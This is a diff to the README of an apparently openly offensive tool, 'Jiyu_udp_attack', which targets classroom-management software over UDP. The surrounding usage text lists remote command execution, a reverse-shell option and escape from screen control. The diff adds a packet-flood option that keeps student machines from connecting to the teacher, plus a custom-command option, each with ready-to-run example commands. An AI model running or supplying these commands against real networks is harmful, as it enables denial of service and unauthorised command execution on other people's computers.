@@ -39,8 +39,8 @@ usage:
             https://github.com/ht0Ruial/Jiyu_udp_attack
 
        [-h] -ip IP [-p P] [-msg MSG] [-c C] [-l L] [-t T]
-       [-e {r,s,g,nc,break,continue}]
-       {r,s,g,nc,break,continue} ...
+       [-e {r,s,g,nc,break,continue,b,x}]
+       {r,s,g,nc,break,continue,b,x} ...
 
 positional arguments:
   {r,s,g,nc,break,continue}
@@ -51,6 +51,8 @@ positional arguments:
     nc                  独立选项，反弹shell的机器需出网，退出可使用命令exit
     break               独立选项，脱离屏幕控制，需要管理员权限
     continue            独立选项，恢复屏幕控制
+    b                   在学生端连接上教师端之前，短时间内大量使用此方法可以实现学生端连不上教师端 eg: -b -l 1000 -t 5
+    x                   用于自定义发送命令，万一 -c 参数发送的命令的报文格式与所用环境不适配，可以抓包自行修改包中的命令
 
 optional arguments:
   -h, --help            show this help message and exit
@@ -60,7 +62,7 @@ optional arguments:
   -c C                  command命令 eg: -c "cmd.exe /c ipconfig"
   -l L                  循环次数，默认为1
   -t T                  循环时间间隔，默认是22秒
-  -e {r,s,g,nc,break,continue}
+  -e {r,s,g,nc,break,continue,b,x}
                         Extra Options加载额外的选项 eg：-e r
           
 ```
@@ -135,6 +137,13 @@ python Jiyu_udp_attack.py -ip 192.168.80.12 -e r
     python Jiyu_udp_attack.py -ip 192.168.80.23/24 -msg "hello,baby!" -l 3 -t 50
 ```
 
+### 9.断连
+短时间内高频次发包，无需指定ip<br>
+此处无需参数-ip，发送的是udp包
+```
+    python Jiyu_udp_attack.py -e b -l 10000 -t 5
+
+```
 
 
 
